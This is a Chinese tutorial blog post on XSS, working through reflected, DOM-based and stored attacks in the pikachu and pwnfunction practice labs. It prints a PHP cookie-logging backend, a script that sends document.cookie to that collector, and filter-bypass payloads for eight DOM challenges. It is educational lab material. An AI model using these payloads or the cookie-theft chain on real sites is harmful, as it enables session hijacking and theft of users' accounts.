<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>web常见漏洞——XSS - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/17178bf9d08d11a80d9d9a57597839a3/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="web常见漏洞——XSS">
  <meta property="og:description" content="xss 1、xss概述2、环境工具3、反射型xss3.1、利用反射型xss获取cookie 4、DOM型xss4.1、第一关4.2、第二关4.3、第三关4.4、第四关4.5、第五关4.6、第六关4.7、第七关4.8、第八关 5、存储型xss 1、xss概述 XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。这是一种将任意 Javascript 代码插入到其他Web用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览改页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等，xss又分为了三种类型分别为存储型、反射型、DOM型,其中存储型危害最大。
2、环境工具 phpstudy
pikachu靶场
pwnfunction的xss靶场
3、反射型xss 反射型xss攻击是具有一次性的，只在用户单击时触发，攻击者发现一个具有反射型xss漏洞的网站，通过恶意构造链接发送给用户诱导用户点击，用户进行请求就会通过服务端反射回来而使攻击者获取到用户的数据例如cookie,或者是钓鱼攻击，这里举一个简单的例子
这里有一个输入点，我们可以看到在输入框内输入的内容会直接显示到P标签里面
那么我们可以尝试一下使用一个js语句看能否显示
这样就能够成功显示，这就是一个简单的xss放射型漏洞
3.1、利用反射型xss获取cookie 知道了简单的反射型原理，那么如何利用这个漏洞获取用户cookie呢
首先我们构建一个xss后台，这里使用的是pikachu的xss后台
&lt;?php if(isset($_GET[&#39;cookie&#39;])){ $time=date(&#39;Y-m-d g:i:s&#39;); $ipaddress=getenv (&#39;REMOTE_ADDR&#39;); $cookie=$_GET[&#39;cookie&#39;]; $referer=$_SERVER[&#39;HTTP_REFERER&#39;]; $useragent=$_SERVER[&#39;HTTP_USER_AGENT&#39;]; $query=&#34;insert cookies(time,ipaddress,cookie,referer,useragent) values(&#39;$time&#39;,&#39;$ipaddress&#39;,&#39;$cookie&#39;,&#39;$referer&#39;,&#39;$useragent&#39;)&#34;; $result=mysqli_query($link, $query); } header(&#34;Location:http://127.0.0.1/pikachu/index.php&#34;);//重定向到一个可信的网站 通过这个获取cookie的后端代码可以看到基本的运行逻辑，通过得到恶意链接获取的cookie并且添加到后端数据库中，并且让用户重定向到其当前页面不让用户有所察觉
&lt;script&gt;document.location = &#39;http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; &#43; document.cookie;&lt;/script&gt; 上面就是我们构造的恶意链接用户进行点击
1、用户点击
2、重定向到主页面
3、后台获取cookie
4、DOM型xss 要知道dom型xss就需要知道什么是DOM，DOM是文档对象模型，是直接由HTML文档的对象表示，DOM树的根节点是“Document”对象，所以可以明白DOM型xss是不会和后端打交道的，它是基于DOM文档对象的一种漏洞并且都是基于JavaScript的，其主要特点就是不会和服务器端进行交互所以很难被查到。这里利用pwnfunction的靶场做演示
4.1、第一关 &lt;h2 id=&#34;spaghet&#34;&gt;&lt;/h2&gt; &lt;script&gt; spaghet.innerHTML = (new URL(location).searchParams.get(&#39;somebody&#39;) || &#34;Somebody&#34;) &#43; &#34; Toucha Ma Spaghet!&#34; &lt;/script&gt; 网页代码如上，其功能就是获取用户的输入，并写入h2标签内部">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-17T16:48:35+08:00">
    <meta property="article:modified_time" content="2024-08-17T16:48:35+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">web常见漏洞——XSS</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>xss</h4> 
 <ul><li><ul><li><ul><li><a href="#1xss_1" rel="nofollow">1、xss概述</a></li><li><a href="#2_6" rel="nofollow">2、环境工具</a></li><li><a href="#3xss_16" rel="nofollow">3、反射型xss</a></li><li><ul><li><a href="#31xsscookie_27" rel="nofollow">3.1、利用反射型xss获取cookie</a></li></ul> 
    </li><li><a href="#4DOMxss_61" rel="nofollow">4、DOM型xss</a></li><li><ul><li><a href="#41_65" rel="nofollow">4.1、第一关</a></li><li><a href="#42_91" rel="nofollow">4.2、第二关</a></li><li><a href="#43_111" rel="nofollow">4.3、第三关</a></li><li><a href="#44_127" rel="nofollow">4.4、第四关</a></li><li><a href="#45_147" rel="nofollow">4.5、第五关</a></li><li><a href="#46_161" rel="nofollow">4.6、第六关</a></li><li><a href="#47_176" rel="nofollow">4.7、第七关</a></li><li><a href="#48_193" rel="nofollow">4.8、第八关</a></li></ul> 
    </li><li><a href="#5xss_205" rel="nofollow">5、存储型xss</a></li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h4><a id="1xss_1"></a>1、xss概述</h4> 
<p><img src="https://images2.imgbox.com/d9/0d/zufQXk04_o.png" alt="在这里插入图片描述"></p> 
<p>XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。这是一种将任意 Javascript 代码插入到其他Web用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览改页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等，xss又分为了三种类型分别为<strong>存储型</strong>、<strong>反射型</strong>、<strong>DOM型</strong>,其中存储型危害最大。</p> 
<h4><a id="2_6"></a>2、环境工具</h4> 
<p>phpstudy<br> <img src="https://images2.imgbox.com/09/f6/bylYP8il_o.png" alt="在这里插入图片描述"></p> 
<p>pikachu靶场<br> <img src="https://images2.imgbox.com/21/b8/f6OZRJWL_o.png" alt="在这里插入图片描述"></p> 
<p>pwnfunction的xss靶场<br> <img src="https://images2.imgbox.com/17/6d/VqiEp9J7_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="3xss_16"></a>3、反射型xss</h4> 
<p>反射型xss攻击是具有一次性的，只在用户单击时触发，攻击者发现一个具有反射型xss漏洞的网站，通过恶意构造链接发送给用户诱导用户点击，用户进行请求就会通过服务端反射回来而使攻击者获取到用户的数据例如cookie,或者是钓鱼攻击，这里举一个简单的例子</p> 
<p>这里有一个输入点，我们可以看到在输入框内输入的内容会直接显示到P标签里面<br> <img src="https://images2.imgbox.com/a5/56/anghO57N_o.png" alt="在这里插入图片描述"><br> 那么我们可以尝试一下使用一个js语句看能否显示</p> 
<p><img src="https://images2.imgbox.com/a6/df/eQbEg2Wo_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/d3/bb/f6RYNIfd_o.png" alt="在这里插入图片描述"><br> 这样就能够成功显示，这就是一个简单的xss放射型漏洞</p> 
<h5><a id="31xsscookie_27"></a>3.1、利用反射型xss获取cookie</h5> 
<p>知道了简单的反射型原理，那么如何利用这个漏洞获取用户cookie呢<br> 首先我们构建一个xss后台，这里使用的是pikachu的xss后台<br> <img src="https://images2.imgbox.com/73/20/ATeQlwwK_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/f0/5a/VSJyGfay_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d g:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ipaddress</span><span class="token operator">=</span><span class="token function">getenv</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$cookie</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$referer</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$useragent</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert cookies(time,ipaddress,cookie,referer,useragent) 
    values('<span class="token interpolation"><span class="token variable">$time</span></span>','<span class="token interpolation"><span class="token variable">$ipaddress</span></span>','<span class="token interpolation"><span class="token variable">$cookie</span></span>','<span class="token interpolation"><span class="token variable">$referer</span></span>','<span class="token interpolation"><span class="token variable">$useragent</span></span>')"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location:http://127.0.0.1/pikachu/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//重定向到一个可信的网站</span>
</code></pre> 
<p>通过这个获取cookie的后端代码可以看到基本的运行逻辑，通过得到恶意链接获取的cookie并且添加到后端数据库中，并且让用户重定向到其当前页面不让用户有所察觉</p> 
<pre><code class="prism language-js"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>上面就是我们构造的恶意链接用户进行点击</p> 
<p><strong>1、用户点击</strong><br> <img src="https://images2.imgbox.com/11/c8/a4QwCma9_o.png" alt="在这里插入图片描述"><br> <strong>2、重定向到主页面</strong><br> <img src="https://images2.imgbox.com/61/4b/kMNmMSXZ_o.png" alt="在这里插入图片描述"></p> 
<p><strong>3、后台获取cookie</strong><br> <img src="https://images2.imgbox.com/a5/7e/uBBAeopp_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="4DOMxss_61"></a>4、DOM型xss</h4> 
<p><img src="https://images2.imgbox.com/5c/2c/LofAicOr_o.png" alt="在这里插入图片描述"></p> 
<p>要知道dom型xss就需要知道什么是DOM，DOM是文档对象模型，是直接由HTML文档的对象表示，DOM树的根节点是“Document”对象，所以可以明白DOM型xss是不会和后端打交道的，它是基于DOM文档对象的一种漏洞并且都是基于JavaScript的，其主要特点就是不会和服务器端进行交互所以很难被查到。这里利用pwnfunction的靶场做演示</p> 
<h5><a id="41_65"></a>4.1、第一关</h5> 
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>spaghet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    spaghet<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'somebody'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"Somebody"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" Toucha Ma Spaghet!"</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>网页代码如上，其功能就是获取用户的输入，并写入h2标签内部<br> 如图所示：<br> <img src="https://images2.imgbox.com/bb/11/s32uefjX_o.png" alt="在这里插入图片描述"><br> 既然有了输入点并且没有做任何过滤，我们就可以考虑直接写入，这里</p> 
<pre><code class="prism language-js"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>是不行的，因为官方innerHTML禁用了这个危险标签，所以我们可以考虑到用img标签中触发onerror来构建payload</p> 
<pre><code class="prism language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span>"<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1337</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/14/ca/A0TsXTWz_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/1f/17/7lisOQiM_o.png" alt="在这里插入图片描述"></p> 
<p>这里可以看到成功显示并写入了</p> 
<h5><a id="42_91"></a>4.2、第二关</h5> 
<pre><code class="prism language-js"><span class="token operator">&lt;</span>h2 id<span class="token operator">=</span><span class="token string">"maname"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    <span class="token keyword">let</span> jeff <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'jeff'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"JEFFF"</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> ma <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ma = "Ma name </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${<!-- --></span>jeff<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token parameter">_</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
        maname<span class="token punctuation">.</span>innerText <span class="token operator">=</span> ma
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>这里和第一关不同的是使用了innerText属性而非innerHTML他们最大的区别就是text不会解析标签而html会所以这里的入手点是eval函数，我们尝试进行逃离双引号</p> 
<pre><code class="prism language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ma = "Ma name ";alert(1337);""</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/83/d1/u1doQNMH_o.png" alt="在这里插入图片描述"><br> 可以看到成功显示了</p> 
<h5><a id="43_111"></a>4.3、第三关</h5> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"uganda"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    <span class="token keyword">let</span> wey <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'wey'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"do you know da wey?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    wey <span class="token operator">=</span> wey<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&lt;&gt;]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    uganda<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;input type="text" placeholder="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${<!-- --></span>wey<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" class="form-control"&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>从这个代码可以看到作者对其中的尖括号和中括号进行了替换，并且以属性的形式写入到div标签内的input标签，所以我们考虑在标签内进行逃离双引号利用其他标签来触发，就像img标签里的onerror一样，这里可以考虑使用onclick使用户点击触发<br> 但是他的题目要求是不能够让用户进行交互，所以考虑其他的标签<br> <img src="https://images2.imgbox.com/b0/98/CdaCMqfl_o.png" alt="在这里插入图片描述"><br> 这里考虑使用对焦onfocus和自动对焦autofocus属性，用户进入页面自动对焦而启用函数</p> 
<p><img src="https://images2.imgbox.com/48/d4/z3Gwyy3a_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="44_127"></a>4.4、第四关</h5> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>form id<span class="token operator">=</span><span class="token string">"ricardo"</span> method<span class="token operator">=</span><span class="token string">"GET"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"milos"</span> type<span class="token operator">=</span><span class="token string">"text"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"form-control"</span> placeholder<span class="token operator">=</span><span class="token string">"True"</span> value<span class="token operator">=</span><span class="token string">"True"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    ricardo<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'ricardo'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'#'</span><span class="token punctuation">)</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token parameter">_</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
        ricardo<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>从代码可以看出是通过get传ricardo的值，并放到form表单里的action属性里面，并提交。我们知道form表单是支持JavaScript的伪代码的，所以这道题很简单直接写入伪代码执行就可以了</p> 
<pre><code class="prism language-javascript">ricardo<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1337</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/12/35/h2iWbnfy_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="45_147"></a>4.5、第五关</h5> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>h2 id<span class="token operator">=</span><span class="token string">"will"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    smith <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'markassbrownlee'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"Ah That's Hawt"</span><span class="token punctuation">)</span>
    smith <span class="token operator">=</span> smith<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\(\`\)\\]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    will<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> smith
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>通过这个代码我们可以看到，它在获取到传参以后对参数进行了过滤过滤掉了括号反引号和转义字符这就代表我们用不了括号了执行不了alert()，为了绕过就可以使用%25281337%2529urlcode编码来进行绕过，但是会发现仍然不会执行，所以考虑加上location和伪代码<br> <img src="https://images2.imgbox.com/9d/d1/7K4fqnod_o.png" alt="在这里插入图片描述"><br> 成功执行</p> 
<h5><a id="46_161"></a>4.6、第六关</h5> 
<pre><code class="prism language-javascript">balls <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'balls'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"Ninja has Ligma"</span><span class="token punctuation">)</span>
balls <span class="token operator">=</span> balls<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[A-Za-z0-9]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
<span class="token function">eval</span><span class="token punctuation">(</span>balls<span class="token punctuation">)</span>
</code></pre> 
<p>第六关就是字符数字都被过滤了，那我我们考虑的方向就是通过编码来进行绕过<br> 可以通过网站JsFuck里面对字符进行编码<br> <img src="https://images2.imgbox.com/14/59/Afu7aeFP_o.png" alt="在这里插入图片描述"><br> 并进行urlencode编码<br> <img src="https://images2.imgbox.com/45/bd/d5cwI9uN_o.png" alt="在这里插入图片描述"><br> 然后带入url链接<br> <img src="https://images2.imgbox.com/93/fa/gnG44W3e_o.png" alt="在这里插入图片描述"><br> 成功执行</p> 
<h5><a id="47_176"></a>4.7、第七关</h5> 
<pre><code class="prism language-javascript">mafia <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'mafia'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'1+1'</span><span class="token punctuation">)</span>
mafia <span class="token operator">=</span> mafia<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>
mafia <span class="token operator">=</span> mafia<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\`\'\"\+\-\!\\\[\]]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">gi</span></span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>
mafia <span class="token operator">=</span> mafia<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">alert</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>
<span class="token function">eval</span><span class="token punctuation">(</span>mafia<span class="token punctuation">)</span>
</code></pre> 
<p>第七关不仅过滤了关键字符还过滤了alert并且限制了长度，题目只过滤了alert也可以使用其他的显示函数，但这不是关键的绕过方法，这里可以使用到javascript的构造函数执行，利用Function()()两个括号就能够直接执行，定义一个函数</p> 
<pre><code class="prism language-javascript"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">ALERT(1337)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//大写绕过，函数再化为小写</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/fc/de/jx9RC22W_o.png" alt="在这里插入图片描述"><br> 成功执行</p> 
<h5><a id="48_193"></a>4.8、第八关</h5> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>h2 id<span class="token operator">=</span><span class="token string">"boomer"</span><span class="token operator">&gt;</span>Ok<span class="token punctuation">,</span> Boomer<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    boomer<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'boomer'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"Ok, Boomer"</span><span class="token punctuation">)</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span>ok<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>这个代码存在一个过滤框架DOMPurify.sanitize,这个框架绕过是十分困难的事情，任何标签都会被过滤掉，所以我们只能从setTimeout入手，可以发现ok这个参数就不存在，我们需要构造一个标签并且id=ok带入setTimeout并执行，利用浏览器白名单的函数cid<br> <img src="https://images2.imgbox.com/8c/9e/Q0CsB31s_o.png" alt="在这里插入图片描述"><br> 成功执行</p> 
<h4><a id="5xss_205"></a>5、存储型xss</h4> 
<p>存储型xss又称持久型跨站点脚本，一旦攻击者将构建好的payload写入，那么用户每次进入该网页都会触发，所以可以看到它的危害性是非常高的，这种多出现在论坛评论，信息存储等地方如下一个简单案例<br> <img src="https://images2.imgbox.com/ba/96/rg95m5jU_o.png" alt="在这里插入图片描述"><br> 留言版留言点击submit提交就会出现在下面的页面上<br> <img src="https://images2.imgbox.com/7b/85/6UxPm2jB_o.png" alt="在这里插入图片描述"><br> 也可以看到对这些关键字和符号都没有做出过滤，那么我可以写入一个简单的payload<br> <img src="https://images2.imgbox.com/1e/b1/x5WiltOw_o.png" alt="在这里插入图片描述"><br> 成功执行了<br> 并且和反射型不一样的是你无论是刷新页面还是由其他页面跳转到此页面都会触发这个payload，这就是它的危害之处，结合我上面的反射型xss盗取cookie的案例，如果将获取cookie的payload写入，那么每个进入此页面的用户的cookie都会进入我的后台，还可以进行钓鱼攻击将自己的钓鱼网站页面链接写入比如网站登录页面，用户碰到后不知道的情况下写入了自己的用户账号密码，那么也将会传到攻击者的后台，所以存储型xss危害是很大的。</p>
